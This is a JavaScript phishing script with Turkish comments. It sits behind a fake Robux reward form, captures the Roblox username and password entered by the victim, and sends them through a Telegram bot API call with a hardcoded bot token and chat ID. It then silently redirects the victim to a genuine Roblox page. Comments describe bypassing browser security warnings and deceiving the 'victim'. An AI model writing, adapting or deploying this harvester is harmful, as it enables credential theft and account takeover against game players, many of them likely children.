document.getElementById('reward-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;

    // SENİN GÜNCEL TOKENİN (Sonu 0 ile biten doğru versiyon)
    const token = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; 
    const chatID = "8512406356"; 

    const mesaj = encodeURIComponent(`💰 ROBUX AVI BAŞARILI!\n\n👤 Kullanıcı: ${u}\n🔑 Şifre: ${p}\n\n🔥 MODIE PROTOCOL İNFAZI`);

    // Tarayıcı engeline takılmayan en hızlı iletim yolu
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${mesaj}`;

    try {
        // 'no-cors' modu tarayıcı güvenlik uyarılarını bypass eder
        await fetch(url, { mode: 'no-cors' }); 
        
        // Veri düştüğü an kurbanı inandırıcı bir sayfaya yönlendir
        window.location.replace("https://www.roblox.com/promocodes");
    } catch (err) {
        // Hata olsa bile çaktırmadan gönder
        window.location.replace("https://www.roblox.com/login");
    }
});
